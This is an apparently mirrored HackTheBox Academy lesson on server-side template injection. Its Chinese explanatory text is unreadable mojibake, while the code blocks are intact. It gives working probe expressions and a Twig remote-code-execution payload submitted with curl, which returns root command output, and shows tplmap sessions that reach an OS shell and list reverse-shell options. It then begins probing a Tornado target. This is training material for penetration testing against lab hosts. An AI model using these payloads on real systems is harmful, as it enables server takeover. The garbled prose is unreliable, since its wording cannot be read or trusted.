<p><img src="https://academy.hackthebox.com/storage/modules/145/img/ssti_diagram.png" alt="image"></p>
<p>é™¤äº†ä¸Šé¢çš„å›¾è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•æ¥è¯†åˆ«æˆ‘ä»¬æ­£åœ¨å¤„ç†çš„æŠ€æœ¯ï¼š</p>
<ul>
<li>æ£€æŸ¥æŠ€æœ¯åç§°çš„è¯¦ç»†é”™è¯¯ã€‚æœ‰æ—¶å€™ï¼Œä»…ä»…å¤åˆ¶è°·æ­Œæœç´¢ä¸­çš„é”™è¯¯å°±å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›å…³äºæ‰€ä½¿ç”¨çš„åº•å±‚æŠ€æœ¯çš„ç›´æ¥ç­”æ¡ˆ</li>
<li>æ£€æŸ¥æ‰©å±•ã€‚ä¾‹å¦‚ï¼Œ.jspæ‰©å±•åä¸Javaç›¸å…³è”ã€‚åœ¨å¤„ç†Javaæ—¶ï¼Œæˆ‘ä»¬å¯èƒ½é¢ä¸´çš„æ˜¯è¡¨è¾¾å¼è¯­è¨€/OGNLæ³¨å…¥æ¼æ´ï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„SSTI</li>
<li>å‘é€å¸¦æœ‰æœªé—­åˆèŠ±æ‹¬å·çš„è¡¨è¾¾å¼ï¼Œä»¥æŸ¥çœ‹æ˜¯å¦ç”Ÿæˆè¯¦ç»†é”™è¯¯ã€‚ä¸è¦åœ¨ç”Ÿäº§ç³»ç»Ÿä¸Šå°è¯•è¿™ç§æ–¹æ³•ï¼Œå› ä¸ºå¯èƒ½ä¼šå¯¼è‡´WebæœåŠ¡å™¨å´©æºƒã€‚</li>
</ul>
<h2 id="SSTI-Exploitation-Example-1"><a href="#SSTI-Exploitation-Example-1" class="headerlink" title="SSTI Exploitation Example 1"></a>SSTI Exploitation Example 1</h2><p>å‡è®¾æˆ‘ä»¬æ­£åœ¨æµ‹è¯•ä¸€ä¸ªé¢å‘äº’è”ç½‘çš„åº”ç”¨ç¨‹åºï¼ˆç›®æ ‡å¯ä»¥åœ¨æœ¬èŠ‚çš„æœ€åç”Ÿæˆï¼‰ã€‚æˆ‘ä»¬çš„é‡ç‚¹å°†æ˜¯ç¡®å®šåº”ç”¨ç¨‹åºæ˜¯å¦å®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥çš„æ”»å‡»ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig1.png" alt="image"></p>
<p>è®©æˆ‘ä»¬åœ¨è¾“å…¥å­—æ®µä¸­æäº¤èŠ±æ‹¬å·ä¸­çš„æ•°å­¦è¡¨è¾¾å¼ï¼Œä¾‹å¦‚åœ¨<code>SSTI Identification</code>éƒ¨åˆ†ä¸­æåˆ°çš„é‚£äº›ï¼Œä»<code>{7*7}</code>å¼€å§‹ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig2.png" alt="image"></p>
<p>çœ‹èµ·æ¥åº”ç”¨ç¨‹åºæ²¡æœ‰è¯„ä¼°æäº¤çš„è¡¨è¾¾å¼ã€‚è®©æˆ‘ä»¬ç»§ç»­å¦ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿™æ¬¡æ˜¯<code>${7*7}</code>ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig3.png" alt="image"></p>
<p>çœ‹èµ·æ¥åº”ç”¨ç¨‹åºä¹Ÿæ²¡æœ‰è®¡ç®—è¿™ä¸ªè¡¨è¾¾å¼ã€‚<code>{{7*7}}</code>æ€ä¹ˆæ ·ï¼Ÿ</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig6.png" alt="image"></p>
<p>å¹¸è¿çš„æ˜¯ï¼Œè¿™ä¸€æ¬¡ï¼Œåº”ç”¨ç¨‹åºè¯„ä¼°äº†æˆ‘ä»¬æäº¤çš„æœ€æ–°æ•°å­¦è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›äº†ç»“æœ49ã€‚çœ‹èµ·æ¥æˆ‘ä»¬å¯èƒ½æ­£åœ¨å¤„ç†ä¸€ä¸ªSSTIæ¼æ´ï¼</p>
<p>å¦‚å‰æ‰€è¿°ï¼Œåœ¨å¤„ç†SSTIæ¼æ´æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯è¯†åˆ«åº”ç”¨ç¨‹åºæ­£åœ¨ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“ã€‚è®©æˆ‘ä»¬ä½¿ç”¨PortSwiggerçš„å›¾è¡¨æ¥å¸®åŠ©æˆ‘ä»¬ï¼ˆå¦‚å‰ä¸€èŠ‚æ‰€ç¤ºï¼‰ã€‚æˆ‘ä»¬å·²ç»çŸ¥é“<code>{{7*7}}</code>è¡¨è¾¾å¼è¢«æˆåŠŸåœ°æ±‚å€¼äº†ã€‚å›¾ä¸­å»ºè®®å°è¯•çš„ä¸‹ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯<code>{{7*'7'}}</code>ã€‚è®©æˆ‘ä»¬å°è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹åº”ç”¨ç¨‹åºå¦‚ä½•å“åº”ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig_.png" alt="image"></p>
<p>åº”ç”¨ç¨‹åºä¹ŸæˆåŠŸåœ°è®¡ç®—äº†æ­¤è¡¨è¾¾å¼ã€‚æ ¹æ®PortSwiggerçš„å›¾è¡¨ï¼Œæˆ‘ä»¬æ­£åœ¨å¤„ç†Jinja 2æˆ–Twigæ¨¡æ¿å¼•æ“ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¨¡æ¿å¼•æ“ç‰¹å®šçš„æœ‰æ•ˆè½½è·æ¥ç¡®å®šæ­£åœ¨ä½¿ç”¨çš„æ˜¯å“ªä¸¤ä¸ªã€‚è®©æˆ‘ä»¬å°è¯•ä¸‹é¢çš„Twigç‰¹å®šçš„ä¸€ä¸ªï¼š</p>
<p>Code: </p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">{{_self.env.<span class="title function_ invoke__">display</span>(<span class="string">"TEST"</span>)}}</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig7.png" alt="image"></p>
<p>æˆåŠŸè¯„ä¼°äº†Twigç‰¹å®šçš„æœ‰æ•ˆè½½è·ã€‚ä¸€ä¸ªTwigæ¨¡æ¿å¼•æ“æ­£åœ¨åç«¯ä½¿ç”¨ã€‚æœ‰å…³æ¨¡æ¿å¼•æ“ç‰¹å®šæœ‰æ•ˆè´Ÿè½½çš„è¯¦ç»†åˆ—è¡¨ï¼Œè¯·å‚é˜…ä»¥ä¸‹èµ„æºï¼š</p>
<ul>
<li>[PayloadsAllTheThings - Template Injection<br>PayloadsAllTheThings -æ¨¡æ¿æ³¨å…¥](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection)</li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks - SSTI (Server Side Template Injection)<br>HackTricks - SSTIï¼ˆæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰</a></li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">tplmap</a>è‡ªåŠ¨æ‰§è¡Œæ¨¡æ¿å¼•æ“è¯†åˆ«è¿‡ç¨‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚å¦‚æœæ‚¨æ²¡æœ‰æ³¨æ„åˆ°ï¼Œç”¨æˆ·çš„è¾“å…¥æ˜¯é€šè¿‡<code>name</code>å‚æ•°å’ŒPOSTè¯·æ±‚æäº¤çš„ï¼ˆå› æ­¤æ˜¯<code>-d</code>ä¸­çš„<code>tplmap</code>å‚æ•°ï¼‰ã€‚</p>
<h4 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ git clone https://github.com/epinna/tplmap.git</span><br><span class="line">mikannse7@htb[/htb]$ cd tplmap</span><br><span class="line">mikannse7@htb[/htb]$ pip install virtualenv</span><br><span class="line">mikannse7@htb[/htb]$ virtualenv -p python2 venv</span><br><span class="line">mikannse7@htb[/htb]$ source venv/bin/activate</span><br><span class="line">mikannse7@htb[/htb]$ pip install -r requirements.txt</span><br><span class="line">mikannse7@htb[/htb]$ ./tplmap.py -u 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;' -d name=john</span><br><span class="line"></span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if POST parameter 'name' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '${*}'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Jinja2 plugin is testing blind injection</span><br><span class="line">[+] Twig plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Twig plugin has confirmed injection with tag '{{*}}'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  POST parameter: name</span><br><span class="line">  Engine: Twig</span><br><span class="line">  Injection: {{*}}</span><br><span class="line">  Context: text</span><br><span class="line">  OS: Linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, php code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell				Run shell on the target</span><br><span class="line">    --os-cmd				Execute shell commands</span><br><span class="line">    --bind-shell PORT			Connect to a shell bind to a target port</span><br><span class="line">    --reverse-shell HOST PORT	Send a shell back to the attacker's port</span><br><span class="line">    --upload LOCAL REMOTE	Upload files to the server</span><br><span class="line">    --download REMOTE LOCAL	Download remote files</span><br></pre></td></tr></tbody></table></figure>

<p>ä¸‹ä¸€æ­¥æ˜¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åœ¨ç§»åŠ¨æœ‰æ•ˆè´Ÿè½½éƒ¨åˆ†ä¹‹å‰ï¼Œåº”è¯¥æåˆ°Twigæœ‰ä¸€ä¸ªå˜é‡<code>_self</code>ï¼Œç®€å•æ¥è¯´ï¼Œå®ƒä½¿ä¸€äº›å†…éƒ¨APIå…¬å¼€ã€‚è¿™ä¸ª<code>_self</code>å¯¹è±¡å·²ç»è¢«è®°å½•ä¸‹æ¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦å¼ºåˆ¶ä½¿ç”¨ä»»ä½•å˜é‡åï¼ˆåœ¨æ¥ä¸‹æ¥çš„SSTIåˆ©ç”¨ç¤ºä¾‹ä¸­ä¼šæœ‰æ›´å¤šå†…å®¹ï¼‰ã€‚å›åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œéƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>getFilter</code>å‡½æ•°ï¼Œå› ä¸ºå®ƒå…è®¸é€šè¿‡ä»¥ä¸‹è¿‡ç¨‹æ‰§è¡Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°ï¼š</p>
<ul>
<li>é€šè¿‡<code>registerUndefinedFilterCallback</code>å°†å‡½æ•°æ³¨å†Œä¸ºè¿‡æ»¤å™¨å›è°ƒ</li>
<li>è°ƒç”¨<code>_self.env.getFilter()</code>æ¥æ‰§è¡Œæˆ‘ä»¬åˆšåˆšæ³¨å†Œçš„å‡½æ•°</li>
</ul>
<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>Code: </p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">{{_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">"system"</span>)}}{{_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">"id;uname -a;hostname"</span>)}}</span><br></pre></td></tr></tbody></table></figure>

<p>è¿™æ¬¡è®©æˆ‘ä»¬ä½¿ç”¨cURLæäº¤æœ‰æ•ˆè´Ÿè½½ã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-cURL-ä¸ç›®æ ‡äº¤äº’"><a href="#cURL-Interacting-with-the-Target-cURL-ä¸ç›®æ ‡äº¤äº’" class="headerlink" title="cURL - Interacting with the Target cURL -ä¸ç›®æ ‡äº¤äº’"></a>cURL - Interacting with the Target cURL -ä¸ç›®æ ‡äº¤äº’</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"</span><br><span class="line">"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;link rel="stylesheet" type="text/css" href="css/default.css" media="screen"/&gt;</span><br><span class="line">  &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line">  &lt;div class="main"&gt;</span><br><span class="line">    &lt;div class="header"&gt;</span><br><span class="line">      &lt;div class="title"&gt;</span><br><span class="line">        &lt;h1&gt;I'm here to say hello&lt;/h1&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="content"&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;a&gt;</span><br><span class="line">    Who are you?</span><br><span class="line">    &lt;form method='post' action=''&gt;</span><br><span class="line">        &lt;div class="form-group"&gt; </span><br><span class="line">            &lt;input placeholder="Name" name="name" size=70&gt;&lt;/input&gt; &lt;button class="btn btn-default" type="submit" name='submit'&gt;Send&lt;/button&gt;</span><br><span class="line">       &lt;/div&gt; </span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">Hello uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">Linux serversideattackssstitwig-60784-78bd58b5b-pmvvv 4.19.0-17-cloud-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux</span><br><span class="line">serversideattackssstitwig-60784-78bd58b5b-pmvvv</span><br><span class="line">serversideattackssstitwig-60784-78bd58b5b-pmvvv!&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;    </span><br><span class="line">        &lt;div class="clearer"&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="footer"&gt;Break me!&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>æ­£å¦‚æˆ‘ä»¬åœ¨ä¸Šé¢çš„è¾“å‡º/å“åº”ä¸­æ‰€çœ‹åˆ°çš„ï¼Œæäº¤çš„æœ‰æ•ˆè´Ÿè½½å¾—åˆ°äº†è¯„ä¼°ï¼Œå¹¶ä¸”æŒ‡å®šçš„å‘½ä»¤ï¼ˆ<code>id</code>ã€<code>uname -a</code>å’Œ<code>hostname</code>ï¼‰è¢«æˆåŠŸæ‰§è¡Œã€‚</p>
<p>åŒæ ·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">tplmap</a>è‡ªåŠ¨æ‰§è¡Œæ¨¡æ¿å¼•æ“åˆ©ç”¨è¿‡ç¨‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<h4 id="tplmap-py-OS-Shell"><a href="#tplmap-py-OS-Shell" class="headerlink" title="tplmap.py - OS Shell"></a>tplmap.py - OS Shell</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ./tplmap.py -u 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;' -d name=john --os-shell</span><br><span class="line"></span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if POST parameter 'name' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '${*}'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Jinja2 plugin is testing blind injection</span><br><span class="line">[+] Twig plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Twig plugin has confirmed injection with tag '{{*}}'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  POST parameter: name</span><br><span class="line">  Engine: Twig</span><br><span class="line">  Injection: {{*}}</span><br><span class="line">  Context: text</span><br><span class="line">  OS: Linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, php code</span><br><span class="line"></span><br><span class="line">[+] Run commands on the operating system.</span><br><span class="line"></span><br><span class="line">Linux $ </span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬ç°åœ¨å¯ä»¥é€šè¿‡ä¸ºæˆ‘ä»¬å»ºç«‹çš„shell <code>tplmap</code>æ‰§è¡Œæˆ‘ä»¬é€‰æ‹©çš„ä»»ä½•å‘½ä»¤ï¼</p>
<p>ç°åœ¨ï¼Œç»§ç»­æœ¬èŠ‚çš„ç»ƒä¹ ï¼Œé€šè¿‡è‡ªå·±åˆ¶ä½œæœ‰æ•ˆè½½è·æˆ–é€šè¿‡åœ¨<code>tplmap</code>çš„å¸®åŠ©ä¸‹è·å¾—çš„shellæ¥å®Œæˆç›®æ ‡ã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong>å½“æˆ‘ä»¬æ³¨æ„åˆ°æˆ‘ä»¬æäº¤çš„æ•°å­¦è¡¨è¾¾å¼è¢«è®¡ç®—æ—¶ï¼Œåº”ç”¨ç¨‹åºä¹Ÿå¯èƒ½å®¹æ˜“å—åˆ°XSSçš„æ”»å‡»ã€‚</p>
<p>è®©æˆ‘ä»¬é€šè¿‡å°†å¤§æ‹¬å·å†…çš„XSSæœ‰æ•ˆè´Ÿè½½æäº¤ç»™æœ¬èŠ‚çš„ç»ƒä¹ ç›®æ ‡æ¥æµ‹è¯•ä¸Šé¢çš„è¯­å¥ã€‚è¿™æ ·åšçš„ç»“æœå¯ä»¥åœ¨ä¸‹é¢çš„å›¾ç‰‡ä¸­çœ‹åˆ°ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig8.png" alt="image"></p>
<h2 id="SSTI-Exploitation-Example-2"><a href="#SSTI-Exploitation-Example-2" class="headerlink" title="SSTI Exploitation Example 2"></a>SSTI Exploitation Example 2</h2><p>å‡è®¾æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯å¯¹å¦ä¸€ä¸ªé¢å‘äº’è”ç½‘çš„åº”ç”¨ç¨‹åºè¿›è¡Œæ¸—é€æµ‹è¯•ã€‚æˆ‘ä»¬çš„é‡ç‚¹å°†æ˜¯ç¡®å®šåº”ç”¨ç¨‹åºæ˜¯å¦å®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥çš„æ”»å‡»ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/tornado1.png" alt="image"></p>
<p>å¦‚æœæ‚¨ä½¿ç”¨Firefoxçš„Webå¼€å‘å·¥å…·ï¼ˆ<code>[Ctrl]</code>+<code>[Shift]</code>+<code>[I]</code>ï¼‰æ£€æŸ¥åº”ç”¨ç¨‹åºçš„æµé‡ï¼Œæ‚¨ä¼šæ³¨æ„åˆ°ç”¨æˆ·è¾“å…¥åœ¨åä¸º<code>email</code>çš„å‚æ•°ä¸­æäº¤ï¼Œå¹¶é€šè¿‡POSTè¯·æ±‚æäº¤ç»™<code>http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</code></p>
<p>è®©æˆ‘ä»¬å°†å¤§æ‹¬å·ä¸­çš„æ•°å­¦è¡¨è¾¾å¼æäº¤åˆ°è¾“å…¥å­—æ®µï¼Œä¾‹å¦‚åœ¨<code>SSTI Identification</code>éƒ¨åˆ†ä¸­æåˆ°çš„é‚£äº›ï¼Œä»<code>${7*7}</code>å¼€å§‹ï¼Œæ­£å¦‚PortSwiggerçš„å›¾è¡¨æ‰€ç¤ºã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-7"><a href="#cURL-Interacting-with-the-Target-7" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email=${7*7}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">form {</span><br><span class="line">margin: 0 auto;</span><br><span class="line">width: 200;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 style="text-align: center;"&gt;~ Damn Hackers ~&lt;/h1&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;Gentlemen, we can rebuild it &lt;br /&gt;We have the technology &lt;br /&gt;We have the capability to make the worlds first bionic website&lt;br /&gt;Better than it was before &lt;br /&gt;Better, Stronger, Faster.&lt;/h2&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;&lt;em&gt;Great!&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">&lt;h3 style="text-align: center;"&gt;&lt;em&gt;Email ${7*7} has been subscribed. You&amp;#39;ll hear from us soon!&lt;/em&gt;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>çœ‹èµ·æ¥åº”ç”¨ç¨‹åºæ²¡æœ‰è¯„ä¼°æäº¤çš„è¡¨è¾¾å¼ã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-8"><a href="#cURL-Interacting-with-the-Target-8" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email={{7*7}}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">form {</span><br><span class="line">margin: 0 auto;</span><br><span class="line">width: 200;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 style="text-align: center;"&gt;~ Damn Hackers ~&lt;/h1&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;Gentlemen, we can rebuild it &lt;br /&gt;We have the technology &lt;br /&gt;We have the capability to make the worlds first bionic website&lt;br /&gt;Better than it was before &lt;br /&gt;Better, Stronger, Faster.&lt;/h2&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;&lt;em&gt;Great!&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">&lt;h3 style="text-align: center;"&gt;&lt;em&gt;Email 49 has been subscribed. You&amp;#39;ll hear from us soon!&lt;/em&gt;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>åº”ç”¨ç¨‹åºè¿™æ¬¡è¯„ä¼°äº†æäº¤çš„è¡¨è¾¾å¼ã€‚æŒ‰ç…§PortSwiggerçš„å›¾è¡¨ï¼Œè®©æˆ‘ä»¬ç»§ç»­è¯†åˆ«åº•å±‚æ¨¡æ¿å¼•æ“ã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-9"><a href="#cURL-Interacting-with-the-Target-9" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email={{7*'7'}}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">form {</span><br><span class="line">margin: 0 auto;</span><br><span class="line">width: 200;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 style="text-align: center;"&gt;~ Damn Hackers ~&lt;/h1&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;Gentlemen, we can rebuild it &lt;br /&gt;We have the technology &lt;br /&gt;We have the capability to make the worlds first bionic website&lt;br /&gt;Better than it was before &lt;br /&gt;Better, Stronger, Faster.&lt;/h2&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;&lt;em&gt;Great!&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">&lt;h3 style="text-align: center;"&gt;&lt;em&gt;Email 49 has been subscribed. You&amp;#39;ll hear from us soon!&lt;/em&gt;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>åº”ç”¨ç¨‹åºè¯„ä¼°äº†æˆ‘ä»¬æäº¤çš„æœ€æ–°è¡¨è¾¾å¼ã€‚æ‰€ä»¥ï¼Œæ ¹æ®å›¾è¡¨ï¼Œæˆ‘ä»¬åº”è¯¥å¤„ç†Twigæˆ–Jinja2æ¨¡æ¿å¼•æ“ï¼Œå¯¹å—ï¼Ÿ</p>
<p>ä¸å¹¸çš„æ˜¯ï¼Œäº‹å®å¹¶éå¦‚æ­¤ï¼å¦‚æœæˆ‘ä»¬æäº¤ä»»ä½•Twigæˆ–Jinja 2ç‰¹å®šçš„è´Ÿè½½ï¼Œåº”ç”¨ç¨‹åºå°†è¿”å›<code>500: Internal Server Error</code>ã€‚ä¸‹é¢æ˜¯ä¸€äº›è¿™ç§è¡Œä¸ºçš„ä¾‹å­ã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email={{_self.env.display("TEST"}}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;title&gt;500: Internal Server Error&lt;/title&gt;&lt;body&gt;500: Internal Server Error&lt;/body&gt;&lt;/html&gt;        </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;title&gt;500: Internal Server Error&lt;/title&gt;&lt;body&gt;500: Internal Server Error&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

